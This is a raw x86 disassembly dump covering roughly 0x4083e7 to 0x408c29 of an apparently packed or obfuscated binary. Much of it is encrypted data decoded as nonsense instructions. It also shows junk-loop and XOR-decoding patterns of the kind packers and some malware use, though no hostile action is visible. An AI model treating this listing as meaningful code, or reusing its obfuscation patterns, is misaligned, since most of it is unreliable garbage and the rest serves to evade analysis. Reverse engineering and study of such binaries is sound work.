  4083e7:	outs   dx,BYTE PTR es:[esi]
  4083e9:	jmp    0xa6e79fe5
  4083ee:	ss cwde 
  4083f0:	xchg   ecx,eax
  4083f1:	loop   0x408433
  4083f3:	inc    esp
  4083f4:	jg     0x4083de
  4083f6:	mov    ds:0xda5f14bc,eax
  4083fb:	lds    esp,FWORD PTR [edi]
  4083fd:	es push ebx
  4083ff:	hlt    
  408400:	cld    
  408401:	fbstp  TBYTE PTR [eax+edi*4+0x4bd5227a]
  408408:	ret    0x3c9f
  40840b:	aad    0xd0
  40840d:	xor    BYTE PTR [ebx+ebp*8],bl
  408410:	cmc    
  408411:	inc    edi
  408412:	fimul  WORD PTR [ebp+0x2d958992]
  408418:	adc    esp,edi
  40841a:	icebp  
  40841b:	or     bh,ah
  40841d:	xchg   BYTE PTR [ebx+esi*1-0x327a8df1],cl
  408424:	cld    
  408425:	push   ecx
  408426:	dec    edx
  408427:	lock imul eax,DWORD PTR es:[ebx],0xffffffad
  40842c:	imul   edi,DWORD PTR [esi-0x774e1d3f],0xb5ac781a
  408436:	(bad)  
  408437:	push   eax
  408438:	clc    
  408439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40843a:	and    edx,DWORD PTR [ebp-0x7d]
  40843d:	std    
  40843e:	dec    edi
  40843f:	inc    eax
  408440:	dec    ebp
  408441:	retf   
  408442:	fmul   DWORD PTR [esi+0x58]
  408445:	pop    edx
  408446:	jbe    0x408494
  408448:	popf   
  408449:	sti    
  40844a:	jno    0x40845e
  40844c:	sub    ch,BYTE PTR [edi-0x50]
  40844f:	popa   
  408450:	sub    al,0x7
  408452:	ds jmp 0x2e7f72b7
  408458:	push   edi
  408459:	inc    eax
  40845a:	and    ebp,esi
  40845c:	mov    ds:0xd92cab4b,eax
  408461:	cdq    
  408462:	clc    
  408463:	push   ss
  408464:	aas    
  408465:	add    DWORD PTR [ecx+esi*4-0x52f9e99a],edx
  40846c:	mov    ah,0xb8
  40846e:	arpl   WORD PTR [ebx+ecx*1+0x3bc7b90e],dx
  408475:	mov    dl,bl
  408477:	lahf   
  408478:	and    dl,0x19
  40847b:	imul   eax,DWORD PTR [eax+0x37],0x35bd6e5c
  408482:	sub    edi,DWORD PTR [edx-0x6b]
  408485:	mov    ?,ecx
  408487:	adc    DWORD PTR [ebp+0x27],0xf3d3c20b
  40848e:	shl    BYTE PTR [esi],0x32
  408491:	mov    dh,0x3e
  408493:	sbb    ebp,DWORD PTR [edx+0x63]
  408496:	not    DWORD PTR [ebx]
  408498:	xchg   edx,eax
  408499:	popf   
  40849a:	in     al,0xdd
  40849c:	sbb    ebp,DWORD PTR [ebx-0xa9659c7]
  4084a2:	pop    ss
  4084a3:	in     al,dx
  4084a4:	or     al,0x4e
  4084a6:	adc    ebx,DWORD PTR [ebx+0x2cfca0ce]
  4084ac:	das    
  4084ad:	inc    eax
  4084ae:	sub    al,0x28
  4084b0:	pushf  
  4084b1:	sti    
  4084b2:	mov    ebp,0xacb92de
  4084b7:	stos   DWORD PTR es:[edi],eax
  4084b8:	xor    BYTE PTR [edx+0x7d],dh
  4084bb:	mov    eax,ds:0x466ad12
  4084c0:	ja     0x4084ba
  4084c2:	jae    0x40848e
  4084c4:	jg     0x4084fb
  4084c6:	sti    
  4084c7:	xor    eax,0xf785bf68
  4084cc:	mov    bh,0xf3
  4084ce:	and    BYTE PTR [ebp+0x47],al
  4084d1:	mov    dl,0x5f
  4084d3:	dec    esi
  4084d4:	xchg   edi,eax
  4084d5:	dec    ebx
  4084d6:	xor    eax,0x96e5f840
  4084db:	icebp  
  4084dc:	and    al,0x7c
  4084de:	push   ecx
  4084df:	addr16 and al,dl
  4084e2:	imul   ebp,DWORD PTR [eax+ebp*8+0x1b],0x23
  4084e7:	mov    al,0x78
  4084e9:	pop    edx
  4084ea:	ss (bad) 
  4084ec:	ror    ecx,1
  4084ee:	xchg   edi,eax
  4084ef:	in     al,0xe8
  4084f1:	jae    0x4084c1
  4084f3:	je     0x408e47
  4084f9:	neg    edx
  4084fb:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  408502:	lea    eax,[ebp-0xc]
  408505:	and    DWORD PTR ds:0x43382f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43382f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43382f,edx
  408521:	cmp    DWORD PTR ds:0x43382f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43382f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433867
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433717,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433773
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4337bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4337bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4337bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4337bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4337bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	cwde   
  4085de:	jge    0x408648
  4085e0:	ja     0x4085ce
  4085e2:	sar    BYTE PTR [esi+0x7e],cl
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	imul   esi,DWORD PTR [esi-0x1a],0x8384eea7
  4085f0:	mov    ch,BYTE PTR [eax-0x7550c6ae]
  4085f6:	dec    edi
  4085f7:	sbb    BYTE PTR [ebp+esi*4+0x2b02588f],al
  4085fe:	dec    ebp
  4085ff:	mov    ds:0x2e953d11,eax
  408604:	sub    BYTE PTR [edi],ah
  408606:	push   0xc81d3d3d
  40860b:	mov    DWORD PTR ds:0x252a4dfa,ebx
  408611:	test   BYTE PTR [edx],0xfb
  408614:	or     BYTE PTR [ebx+eax*1-0x6536d7d3],dh
  40861b:	add    eax,DWORD PTR [ebp+0x5]
  40861e:	add    BYTE PTR [ebx+0x549c9d6f],cl
  408624:	inc    ebx
  408625:	dec    esp
  408626:	aad    0xe8
  408628:	frstor [edi-0x4a]
  40862b:	rcr    DWORD PTR [ebp+0x75063558],0x5c
  408632:	hlt    
  408633:	push   edx
  408634:	addr16 inc ebp
  408636:	cmp    eax,esp
  408638:	cld    
  408639:	sub    BYTE PTR [esi],dl
  40863b:	cs popf 
  40863d:	pop    es
  40863e:	mov    al,0xeb
  408640:	dec    esp
  408641:	mov    ds:0xf5a7f3c2,al
  408646:	xor    BYTE PTR [edi+0x4b],0xa8
  40864a:	fsub   DWORD PTR [ecx]
  40864c:	jno    0x408675
  40864e:	clc    
  40864f:	adc    ah,cl
  408651:	mov    edi,0xd01c68fb
  408656:	xchg   esi,eax
  408657:	(bad)  
  408658:	mov    ds:0xe3d13f86,eax
  40865d:	fisub  DWORD PTR [ebx]
  40865f:	xor    eax,0x8f2f1e7
  408664:	push   ecx
  408665:	retf   
  408666:	cdq    
  408667:	popa   
  408668:	and    ch,BYTE PTR [edx+ebp*8]
  40866b:	add    BYTE PTR [ebx],0x82
  40866e:	mov    al,BYTE PTR [esp+edi*1-0x6d]
  408672:	jae    0x40864c
  408674:	mov    ch,0x7
  408676:	adc    al,0x3a
  408678:	fs retf 0x5885
  40867c:	adc    ebx,edi
  40867e:	jns    0x40863c
  408680:	xchg   esp,eax
  408681:	test   eax,0x9274a2ef
  408686:	push   cs
  408687:	idiv   DWORD PTR [ebp+0x18f84b57]
  40868d:	loope  0x40868e
  40868f:	clc    
  408690:	les    edi,FWORD PTR [ecx]
  408692:	dec    DWORD PTR [esi]
  408694:	inc    esp
  408695:	data16 outs dx,BYTE PTR ds:[esi]
  408697:	xlat   BYTE PTR ds:[ebx]
  408698:	jmp    0x26a2:0xf13ad81
  40869f:	cmp    al,BYTE PTR [esi+0x30]
  4086a2:	mov    dl,BYTE PTR [edi+0x6dceb19b]
  4086a8:	mov    edx,DWORD PTR [ebx]
  4086aa:	inc    ecx
  4086ab:	jg     0x408708
  4086ad:	mov    ebp,0x879ef321
  4086b2:	sahf   
  4086b3:	sub    BYTE PTR [esi+0x66e7ba0d],0xd4
  4086ba:	xchg   esi,eax
  4086bb:	jae    0x4086b2
  4086bd:	aam    0x7e
  4086bf:	mov    cl,0xac
  4086c1:	pushf  
  4086c2:	in     al,dx
  4086c3:	mov    ebp,0x7423bc48
  4086c8:	mov    cl,0xbb
  4086ca:	test   DWORD PTR [esi+0x27],edx
  4086cd:	adc    dl,BYTE PTR [esi-0x2521bd9]
  4086d3:	add    DWORD PTR [ebx-0x13],edx
  4086d6:	cmc    
  4086d7:	je     0x40868f
  4086d9:	xchg   BYTE PTR [ebp+0x78],dh
  4086dc:	mov    bl,0x43
  4086de:	out    0x2e,eax
  4086e0:	dec    esp
  4086e1:	mov    al,ds:0xff1b7658
  4086e6:	xchg   ebx,eax
  4086e7:	(bad)  
  4086e8:	cmp    al,BYTE PTR [ebx-0x36]
  4086eb:	mov    al,0x54
  4086ed:	sub    dh,0x39
  4086f0:	and    al,0x61
  4086f2:	loop   0x4086e4
  4086f4:	test   al,0xb5
  4086f6:	pop    edi
  4086f7:	ficomp WORD PTR [edi-0x6c]
  4086fa:	xor    cl,BYTE PTR ss:[ecx+0x523323f5]
  408701:	add    al,BYTE PTR [esp+ecx*1-0x25]
  408705:	mov    WORD PTR [ecx+0x3c850fac],?
  40870b:	dec    eax
  40870c:	xchg   ebp,eax
  40870d:	cmp    ebp,0xffffffdb
  408710:	push   ss
  408711:	aaa    
  408712:	dec    esi
  408713:	arpl   WORD PTR [ebp+0xd],ax
  408716:	inc    ebx
  408717:	loope  0x40873b
  408719:	sbb    ebx,DWORD PTR es:[esi-0x33]
  40871d:	fst    QWORD PTR [esi+edi*4-0x8]
  408721:	repz dec esi
  408723:	and    BYTE PTR [edx-0x2],bh
  408726:	mov    al,ds:0x7bbf9bc9
  40872b:	xchg   ebx,eax
  40872c:	shr    DWORD PTR [ecx+0x62],cl
  40872f:	test   BYTE PTR [ebp-0x69],0xa4
  408733:	xchg   ebx,eax
  408734:	add    BYTE PTR [edi+ebx*4-0x336a4f0c],ah
  40873b:	mov    bh,0x58
  40873d:	cmp    bh,dh
  40873f:	sub    DWORD PTR [edi+0x44],0x28
  408743:	xor    eax,0x51f11f1f
  408748:	mov    edi,0x307ed05d
  40874d:	loope  0x40870e
  40874f:	imul   edi,DWORD PTR [eax+0x458ba8a2],0x3c133f8
  408759:	(bad)  
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     BYTE PTR [ebp*8-0x2cadc7a3],al
  408771:	jle    0x4087f1
  408773:	in     al,0x7f
  408775:	jle    0x4087f5
  408777:	adc    ch,BYTE PTR ds:0x3ef9b654
  40877d:	mov    ebp,0x77af5bdd
  408782:	jmp    0x32526574
  408787:	sub    DWORD PTR [eax],0xddb44db6
  40878d:	js     0x408714
  40878f:	sbb    eax,0xf9a43a05
  408794:	dec    edi
  408795:	mov    es,WORD PTR [ecx+ecx*4]
  408798:	call   0x556fb6c
  40879d:	dec    ebp
  40879e:	lods   al,BYTE PTR ds:[esi]
  40879f:	xchg   esi,eax
  4087a0:	(bad)  
  4087a1:	jo     0x40877f
  4087a3:	sbb    ch,BYTE PTR [eax+0x6d]
  4087a6:	mov    bh,BYTE PTR [ebp+0x5]
  4087a9:	rcl    esi,1
  4087ab:	cmp    eax,DWORD PTR [edx-0x2]
  4087ae:	retf   0x3c71
  4087b1:	add    cl,al
  4087b3:	inc    ecx
  4087b4:	imul   esi,DWORD PTR ds:0x1b32a60c,0xf3a0b965
  4087be:	repz dec edx
  4087c0:	mov    BYTE PTR [esi+0x35fa025b],al
  4087c6:	leave  
  4087c7:	retf   0xc564
  4087ca:	and    al,0x8
  4087cc:	dec    ebx
  4087cd:	loope  0x408832
  4087cf:	mov    ecx,DWORD PTR [eax+ebp*1]
  4087d2:	mov    eax,ds:0xebe2823a
  4087d7:	mov    dl,BYTE PTR [edi-0x1e]
  4087da:	pop    ebp
  4087db:	int3   
  4087dc:	(bad)  
  4087dd:	in     al,dx
  4087de:	inc    edx
  4087df:	or     eax,0x4d3ffcbf
  4087e4:	inc    eax
  4087e5:	aam    0x1b
  4087e7:	test   al,0xaa
  4087e9:	inc    ebp
  4087ea:	inc    ebx
  4087eb:	adc    edx,DWORD PTR [edx]
  4087ed:	add    bl,ch
  4087ef:	jo     0x40885e
  4087f1:	push   esp
  4087f2:	fsub   st(4),st
  4087f4:	pop    ss
  4087f5:	pop    ebp
  4087f6:	aas    
  4087f7:	mov    bh,0xdb
  4087f9:	mov    ah,0xeb
  4087fb:	gs dec ebx
  4087fd:	mov    ebp,0x266b7de3
  408802:	sbb    eax,DWORD PTR ds:0x8d78ab8b
  408808:	mov    esi,0x526d2a58
  40880d:	jno    0x4087f8
  40880f:	mov    bl,0x78
  408811:	dec    eax
  408812:	leave  
  408813:	call   0xf344251a
  408818:	add    al,0x92
  40881a:	in     eax,dx
  40881b:	retf   0x4078
  40881e:	scas   eax,DWORD PTR es:[edi]
  40881f:	mov    ds:0x4b4ebe1c,al
  408824:	inc    edx
  408825:	push   ss
  408826:	pop    eax
  408827:	ja     0x408802
  408829:	clc    
  40882a:	or     eax,DWORD PTR [ebp+0x2e443cc6]
  408830:	mov    bl,0x9f
  408832:	xor    BYTE PTR [edi+edi*4+0xd845faa],0x8e
  40883a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40883b:	push   ebx
  40883c:	jo     0x408836
  40883e:	push   ecx
  40883f:	int    0x53
  408841:	push   esp
  408842:	pushf  
  408843:	aad    0xa3
  408845:	sub    DWORD PTR [eax],edi
  408847:	das    
  408848:	xchg   esp,eax
  408849:	sbb    DWORD PTR [ebp+0x4babe213],esp
  40884f:	dec    ecx
  408850:	pop    edi
  408851:	sbb    esp,DWORD PTR [esi]
  408853:	loope  0x4088bf
  408855:	out    0x5b,eax
  408857:	dec    esi
  408858:	push   edi
  408859:	fcmovnbe st,st(5)
  40885b:	sub    ah,BYTE PTR [edi+0x5e66e105]
  408861:	(bad)  [esi-0x30fcc1b1]
  408867:	xchg   esi,eax
  408868:	cld    
  408869:	pop    edx
  40886a:	ret    
  40886b:	mov    esp,0x2a109a3e
  408870:	mov    WORD PTR [esi],?
  408872:	rol    DWORD PTR [esi+edx*8+0x1b],cl
  408876:	je     0x40886b
  408878:	popa   
  408879:	mov    edi,0x428fbf04
  40887e:	cmp    eax,0x976b4926
  408883:	pop    esi
  408884:	dec    edx
  408885:	js     0x408833
  408887:	outs   dx,BYTE PTR ds:[esi]
  408888:	hlt    
  408889:	dec    edx
  40888a:	xchg   ebp,eax
  40888b:	sbb    ecx,esp
  40888d:	dec    ebx
  40888e:	jmp    0xa9f3:0x55606021
  408895:	lods   eax,DWORD PTR ds:[esi]
  408896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408897:	sahf   
  408898:	or     eax,0x6f8e4065
  40889d:	dec    edi
  40889e:	nop
  40889f:	ins    BYTE PTR es:[edi],dx
  4088a0:	into   
  4088a1:	add    eax,0x3a1ba78f
  4088a6:	ins    BYTE PTR es:[edi],dx
  4088a7:	or     al,0x7d
  4088a9:	loope  0x408890
  4088ab:	sbb    ebx,edi
  4088ad:	xchg   esp,eax
  4088ae:	cmp    ah,ch
  4088b0:	add    DWORD PTR [edx-0x51910abf],esp
  4088b6:	shr    BYTE PTR [edx-0x218decab],cl
  4088bc:	bound  ebx,QWORD PTR [ebx]
  4088be:	fmul   QWORD PTR [edx+0x5]
  4088c1:	std    
  4088c2:	icebp  
  4088c3:	push   0xffffffc8
  4088c5:	add    al,0x71
  4088c7:	or     esi,DWORD PTR [ecx]
  4088c9:	or     eax,0xd9517b5a
  4088ce:	mov    edx,0x80ff4893
  4088d3:	mov    bh,0x9b
  4088d5:	lods   al,BYTE PTR ds:[esi]
  4088d6:	and    al,0x9c
  4088d8:	jne    0x408905
  4088da:	das    
  4088db:	das    
  4088dc:	cmp    BYTE PTR [eax-0x30],al
  4088df:	lock xchg edi,eax
  4088e1:	pop    edi
  4088e2:	pop    esi
  4088e3:	pop    ebx
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0x96fb681a
  40893f:	dec    esi
  408940:	stos   BYTE PTR es:[edi],al
  408941:	cmp    cl,dl
  408943:	jle    0x4089c3
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	jnp    0x4088dd
  40894b:	jp     0x40893b
  40894d:	dec    eax
  40894e:	into   
  40894f:	lods   al,BYTE PTR ds:[esi]
  408950:	outs   dx,BYTE PTR ds:[esi]
  408951:	in     al,0xf5
  408953:	and    DWORD PTR [esi-0x6bd8d118],ecx
  408959:	and    edx,DWORD PTR [esi-0x12]
  40895c:	icebp  
  40895d:	add    eax,0xd71a7c93
  408962:	daa    
  408963:	fst    QWORD PTR [ebp+edi*1-0x7003e4bb]
  40896a:	leave  
  40896b:	ins    DWORD PTR es:[edi],dx
  40896c:	dec    eax
  40896d:	je     0x4089a4
  40896f:	dec    ecx
  408970:	jmp    0x40895f
  408972:	cli    
  408973:	xor    ebx,DWORD PTR [ebx-0x18]
  408976:	push   edi
  408977:	inc    ebp
  408978:	shr    BYTE PTR [eax-0x30],1
  40897b:	aad    0x73
  40897d:	mov    bl,0x9b
  40897f:	nop
  408980:	ret    0xdeb8
  408983:	pusha  
  408984:	xchg   esi,eax
  408985:	sbb    al,0x4c
  408987:	push   es
  408988:	fadd   DWORD PTR [edx-0x31]
  40898b:	sbb    ebx,eax
  40898d:	dec    esi
  40898e:	mov    edi,0xce4c0142
  408993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408994:	jbe    0x4089d2
  408996:	pop    es
  408997:	and    eax,0xb7cba4b0
  40899c:	fwait
  40899d:	jns    0x4089e0
  40899f:	sub    edx,DWORD PTR [ecx]
  4089a1:	int3   
  4089a2:	ins    BYTE PTR es:[edi],dx
  4089a3:	dec    edx
  4089a4:	jecxz  0x40893d
  4089a6:	xlat   BYTE PTR ds:[ebx]
  4089a7:	frstor [ebp+0x34]
  4089aa:	aam    0x5f
  4089ac:	xor    edi,DWORD PTR [esi+0x45]
  4089af:	mov    DWORD PTR [ecx+0x5f],edi
  4089b2:	daa    
  4089b3:	pop    ds
  4089b4:	sbb    eax,0x3427a373
  4089b9:	push   0xfc7038f0
  4089be:	and    cl,bl
  4089c0:	push   ds
  4089c1:	dec    ebp
  4089c2:	push   ecx
  4089c3:	inc    esp
  4089c4:	sub    dh,dh
  4089c6:	sbb    BYTE PTR [eax+0x50646545],dh
  4089cc:	sub    BYTE PTR [esi-0x50],0xc1
  4089d0:	adc    al,dl
  4089d2:	mov    dh,0xc2
  4089d4:	xchg   DWORD PTR [ebx-0xca61ab8],ecx
  4089da:	popa   
  4089db:	adc    BYTE PTR [esi],ch
  4089dd:	and    DWORD PTR [esi],edx
  4089df:	pop    ds
  4089e0:	adc    eax,0x9d8ca6d5
  4089e5:	clc    
  4089e6:	adc    DWORD PTR ss:[ebx-0x46],esp
  4089ea:	lock xchg DWORD PTR [esi-0x63],edx
  4089ee:	sub    al,0x70
  4089f0:	or     bh,BYTE PTR [edx-0x3b74e967]
  4089f6:	or     edx,DWORD PTR [edx]
  4089f8:	retf   0x52e1
  4089fb:	xchg   ecx,eax
  4089fc:	add    DWORD PTR [esi+0x2019b0c1],esp
  408a02:	sbb    BYTE PTR [edx+0x3e],bl
  408a05:	pop    ebp
  408a06:	push   esi
  408a07:	push   ebp
  408a08:	xchg   ebx,eax
  408a09:	push   ecx
  408a0a:	xor    ah,dh
  408a0c:	cld    
  408a0d:	and    ch,BYTE PTR [esi+ebx*4-0xa]
  408a11:	sub    eax,0x32334dca
  408a16:	mov    ebx,gs
  408a18:	std    
  408a19:	cmp    ebp,DWORD PTR [esi+esi*1]
  408a1c:	fs je  0x4089ed
  408a1f:	cli    
  408a20:	test   al,0xe7
  408a22:	pop    ebx
  408a23:	jnp    0x4089b4
  408a25:	and    al,al
  408a27:	cmp    eax,0x18869f2d
  408a2c:	mov    cl,0xbb
  408a2e:	mov    ch,0x47
  408a30:	push   ecx
  408a31:	inc    edx
  408a32:	dec    eax
  408a33:	nop
  408a34:	call   0x2cd64f4
  408a39:	pop    esi
  408a3a:	retf   
  408a3b:	pop    ebp
  408a3c:	push   edi
  408a3d:	aad    0xa7
  408a3f:	mov    eax,0x1f2913fa
  408a44:	sub    ebp,DWORD PTR [edx-0x32f884e7]
  408a4a:	lods   eax,DWORD PTR ds:[esi]
  408a4b:	mov    dh,0xfe
  408a4d:	(bad)  
  408a4e:	test   DWORD PTR [eax+ebp*2-0x5],edi
  408a52:	dec    esi
  408a53:	mov    eax,0x55ce9ccf
  408a58:	loope  0x408a4f
  408a5a:	pop    es
  408a5b:	jae    0x408a2c
  408a5d:	jg     0x408a02
  408a5f:	(bad)  
  408a60:	(bad)  
  408a61:	stos   BYTE PTR es:[di],al
  408a63:	cmp    ebx,esp
  408a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a66:	fs push 0x2f
  408a69:	sub    dl,BYTE PTR [edi+0x71ce0150]
  408a6f:	inc    esp
  408a70:	mov    dh,BYTE PTR [eax-0x7573e3b6]
  408a76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a77:	in     eax,dx
  408a78:	push   cs
  408a79:	mov    esp,0x42a1d8eb
  408a7e:	les    esp,FWORD PTR [ecx+0x587def06]
  408a84:	dec    edi
  408a85:	adc    eax,0x43bc2764
  408a8a:	div    DWORD PTR ds:0xf2a2747
  408a90:	mul    BYTE PTR [edx-0x4206256]
  408a96:	pop    edx
  408a97:	and    eax,0x13c0b6f9
  408a9c:	rcr    DWORD PTR [edi-0x79730e5b],cl
  408aa2:	fcmovu st,st(7)
  408aa4:	dec    esi
  408aa5:	repnz in eax,0xa9
  408aa8:	sbb    BYTE PTR [ecx],bh
  408aaa:	jne    0x408af6
  408aac:	push   esi
  408aad:	sub    eax,0xcb915a39
  408ab2:	mov    ah,0x8b
  408ab4:	jge    0x408abe
  408ab6:	mov    edi,DWORD PTR [edi]
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	and    DWORD PTR [edx+edx*2],0xfffffffb
  408b1e:	scas   al,BYTE PTR es:[edi]
  408b1f:	fidivr WORD PTR [esi+0x7e]
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	pop    es
  408b27:	shl    dh,1
  408b29:	inc    ebp
  408b2a:	pop    ds
  408b2b:	xchg   esi,eax
  408b2c:	out    0xec,al
  408b2e:	mov    ch,0x9b
  408b30:	adc    bh,bh
  408b32:	shl    eax,cl
  408b34:	mov    edi,0x681468e2
  408b39:	cmp    DWORD PTR [ebp-0x41193625],ebp
  408b3f:	addr16 gs jbe 0x408b6a
  408b43:	mov    bl,0xc5
  408b45:	xchg   esi,eax
  408b46:	push   cs
  408b47:	jb     0x408b93
  408b49:	inc    esi
  408b4a:	mov    dh,0x10
  408b4c:	mov    ah,BYTE PTR [esi+edx*8]
  408b4f:	ins    DWORD PTR es:[edi],dx
  408b50:	ss xchg ecx,eax
  408b52:	xchg   edx,eax
  408b53:	add    bl,BYTE PTR [ecx+eax*4-0x2f]
  408b57:	sbb    al,0xba
  408b59:	retf   0xc597
  408b5c:	(bad)  
  408b5e:	ja     0x408b0b
  408b60:	inc    ebx
  408b61:	ss aam 0x49
  408b64:	add    edx,ebp
  408b66:	mov    ds,ecx
  408b68:	imul   eax,DWORD PTR [ebx-0x3c797962],0x88f73d5a
  408b72:	fwait
  408b73:	mov    bl,0xa1
  408b75:	iret   
  408b76:	pop    DWORD PTR [edi-0x14]
  408b79:	sub    bh,BYTE PTR [edi]
  408b7b:	inc    edx
  408b7c:	repnz xor ebp,ebx
  408b7f:	mov    ch,BYTE PTR [eax]
  408b81:	push   ss
  408b82:	stos   BYTE PTR es:[edi],al
  408b83:	(bad)  
  408b84:	pop    eax
  408b85:	push   cs
  408b86:	mov    ch,0xa6
  408b88:	and    al,bh
  408b8a:	sbb    DWORD PTR [ebx-0x6c],ecx
  408b8d:	call   0x4349097e
  408b92:	shr    bl,cl
  408b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b95:	sahf   
  408b96:	pop    ebp
  408b97:	push   edx
  408b98:	pop    esi
  408b99:	int    0x44
  408b9b:	ds or  al,0x11
  408b9e:	cmp    DWORD PTR [ecx-0x66a4bc01],ecx
  408ba4:	dec    eax
  408ba5:	test   al,0xc9
  408ba7:	inc    edi
  408ba8:	xor    dl,BYTE PTR [eax+0x22cdc762]
  408bae:	shl    ch,0x6d
  408bb1:	mov    eax,ds:0x5890d6a4
  408bb6:	cmc    
  408bb7:	jae    0x408bd5
  408bb9:	push   0x23
  408bbb:	push   edx
  408bbc:	sbb    BYTE PTR [edx],0xa6
  408bbf:	gs pushf 
  408bc1:	xor    eax,0xb5ff4d9c
  408bc6:	push   ds
  408bc7:	loope  0x408ba1
  408bc9:	pop    esp
  408bca:	inc    ebx
  408bcb:	test   al,0xfc
  408bcd:	rcr    BYTE PTR [ecx],cl
  408bcf:	jg     0x408bb0
  408bd1:	test   BYTE PTR [ebx+0x7d2f2cdf],dh
  408bd7:	jge    0x408b5a
  408bd9:	jo     0x408c1f
  408bdb:	hlt    
  408bdc:	repnz sub ah,ah
  408bdf:	push   0xffffff99
  408be1:	call   0x7007:0x47a0fa77
  408be8:	shr    edx,1
  408bea:	dec    esp
  408beb:	das    
  408bec:	sbb    eax,DWORD PTR [ebp+0x47]
  408bef:	inc    ebx
  408bf0:	cs inc ebp
  408bf2:	sbb    dl,BYTE PTR [edx+eiz*4]
  408bf5:	adc    eax,0x27b0ed50
  408bfb:	dec    esi
  408bfc:	sbb    al,0x84
  408bfe:	xor    ebx,DWORD PTR [ecx]
  408c00:	jp     0x408bac
  408c02:	sahf   
  408c03:	je     0x408c33
  408c05:	mov    ch,dh
  408c07:	pop    edi
  408c08:	push   ss
  408c09:	stc    
  408c0a:	pop    ds
  408c0b:	xchg   BYTE PTR [esi-0x7620680f],dh
  408c11:	jle    0x408bf2
  408c13:	pop    ds
  408c14:	sbb    al,0xe2
  408c16:	ffree  st(3)
  408c18:	dec    edi
  408c19:	sar    esp,1
  408c1b:	fisubr WORD PTR [ebp-0x10]
  408c1e:	sbb    al,0x93
  408c20:	rol    DWORD PTR [eax-0x61],cl
  408c23:	stc    
  408c24:	pop    esi
  408c25:	mov    es,WORD PTR [ebp+edx*8-0x3f]
  408c29:	jne    0x408c03
